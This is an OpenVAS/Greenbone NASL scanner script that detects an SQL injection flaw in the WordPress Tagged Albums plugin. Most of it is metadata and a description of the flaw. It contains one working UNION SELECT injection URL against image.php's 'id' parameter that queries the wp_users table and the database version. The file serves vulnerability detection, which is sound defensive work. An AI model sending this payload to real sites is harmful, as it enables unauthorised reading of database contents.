# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803051");
  script_version("2023-07-25T05:05:58+0000");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-11-19 11:18:38 +0530 (Mon, 19 Nov 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("WordPress Tagged Albums Plugin 'id' Parameter SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/80101");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/56569");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/118146/WordPress-Tagged-Albums-SQL-Injection.html");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to manipulate SQL
  queries by injecting arbitrary SQL code and gain sensitive information.");

  script_tag(name:"affected", value:"WordPress Tagged Albums Plugin");

  script_tag(name:"insight", value:"Input passed via the 'id' parameter to
  /wp-content/plugins/taggedalbums/image.php is not properly sanitised before
  being used in a SQL query.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"WordPress Tagged Albums Plugin is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + '/wp-content/plugins/taggedalbums/image.php?id=-5/**/union/**/select/**/1,group_concat(0x73716C692D74657374,0x3a,@@version),3,4,5,6,7,8/**/from/**/wp_users--';

if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:"sqli-test:[0-9]+.*:sqli-test", extra_check:">Gallery")){
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
